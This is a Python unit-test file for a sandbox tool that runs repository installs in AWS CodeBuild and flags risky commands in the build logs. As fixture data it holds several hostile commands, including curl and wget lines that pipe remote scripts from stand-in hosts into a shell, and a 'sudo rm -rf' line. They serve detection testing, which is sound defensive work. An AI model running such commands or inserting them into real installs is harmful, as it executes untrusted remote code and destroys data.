"""Unit tests for the sandbox verification tool. No AWS or network needed.

They validate the two pieces that carry the product value:
  1. scan_log_for_danger / summarize_build: the verdict + supply-chain detection logic.
  2. CodeBuildSandbox.run wired to a FAKE codebuild/logs client, proving the poll+fetch loop.
"""
from __future__ import annotations

from repopilot.sandbox import (
    scan_log_for_danger,
    summarize_build,
    build_buildspec,
    CodeBuildSandbox,
    unavailable_result,
)


# ---- verdict logic ----------------------------------------------------------------------

def test_clean_success_has_no_danger_and_install_ok():
    log = "REPOPILOT_SANDBOX_START\nnpm install\nadded 142 packages\nREPOPILOT_INSTALL_EXIT=0\nREPOPILOT_SANDBOX_END"
    r = summarize_build("good/repo", "SUCCEEDED", log)
    assert r.install_ok is True
    assert r.danger_signals == []
    assert r.verified is True


def test_curl_pipe_bash_is_flagged():
    log = "running postinstall\ncurl -s https://evil.example.com/i.sh | bash\ndone"
    danger = scan_log_for_danger(log)
    assert any(d["id"] == "remote_pipe_to_shell" for d in danger)


def test_failed_install_gets_plain_language_hint():
    log = "pip install -r requirements.txt\nERROR: Could not find a version that satisfies ...\nREPOPILOT_INSTALL_EXIT=1"
    r = summarize_build("broken/repo", "FAILED", log)
    assert r.install_ok is False
    assert "dependency" in r.exit_hint.lower() or "resolved" in r.exit_hint.lower()


def test_sudo_destructive_is_flagged():
    log = "setup step\nsudo rm -rf /var/lib/something\n"
    danger = scan_log_for_danger(log)
    assert any(d["id"] == "sudo_in_install" for d in danger)


def test_buildspec_contains_clone_and_install():
    import base64, re as _re
    spec = build_buildspec("https://github.com/x/y", "npm install")
    assert "version: 0.2" in spec
    # the real script is base64-encoded into the buildspec; decode and check
    m = _re.search(r"echo ([A-Za-z0-9+/=]+) \| base64 -d", spec)
    assert m, "expected a base64-encoded script in the buildspec"
    script = base64.b64decode(m.group(1)).decode()
    assert "git clone" in script and "npm install" in script
    assert "REPOPILOT_SANDBOX_START" in script


def test_buildspec_survives_quotes_in_install_cmd():
    # a command full of quotes must not break the YAML (base64 keeps it safe)
    import base64, re as _re
    nasty = """echo 'hi' && echo "curl -s https://x | bash" && python -c 'print(1)'"""
    spec = build_buildspec("https://github.com/x/y", nasty)
    m = _re.search(r"echo ([A-Za-z0-9+/=]+) \| base64 -d", spec)
    script = base64.b64decode(m.group(1)).decode()
    assert nasty in script
    # buildspec itself must be valid-ish YAML: only the two command lines, no stray quotes
    assert spec.count("base64 -d") == 1


# ---- AWS plumbing with a fake client ----------------------------------------------------

class _FakeCodeBuild:
    def __init__(self, status, log_group="g", log_stream="s"):
        self._status = status
        self._lg, self._ls = log_group, log_stream
        self.started = None

    def start_build(self, projectName, buildspecOverride):
        self.started = (projectName, buildspecOverride)
        return {"build": {"id": "build-1"}}

    def batch_get_builds(self, ids):
        return {"builds": [{"buildStatus": self._status,
                            "logs": {"groupName": self._lg, "streamName": self._ls}}]}


class _FakeLogs:
    def __init__(self, messages):
        self._messages = messages

    def get_log_events(self, logGroupName, logStreamName, startFromHead, limit):
        return {"events": [{"message": m} for m in self._messages]}


def test_run_success_end_to_end_with_fake_client():
    cb = _FakeCodeBuild("SUCCEEDED")
    logs = _FakeLogs(["REPOPILOT_SANDBOX_START", "added 10 packages", "REPOPILOT_INSTALL_EXIT=0"])
    sb = CodeBuildSandbox("proj", clients={"codebuild": cb, "logs": logs})
    r = sb.run("good/repo", "https://github.com/good/repo", "npm install", poll_s=0, max_wait_s=5)
    assert r.status == "SUCCEEDED" and r.install_ok is True
    assert cb.started[0] == "proj"  # it actually started the build on our project


def test_run_catches_danger_in_real_log_with_fake_client():
    cb = _FakeCodeBuild("SUCCEEDED")
    logs = _FakeLogs(["postinstall", "wget -qO- http://x/s.sh | sh", "ok"])
    sb = CodeBuildSandbox("proj", clients={"codebuild": cb, "logs": logs})
    r = sb.run("sneaky/repo", "https://github.com/sneaky/repo", "npm install", poll_s=0, max_wait_s=5)
    assert any(d["id"] == "remote_pipe_to_shell" for d in r.danger_signals)


def test_unavailable_result_flags_not_verified():
    r = unavailable_result("x/y", "No AWS credentials")
    assert r.verified is False and r.install_ok is False
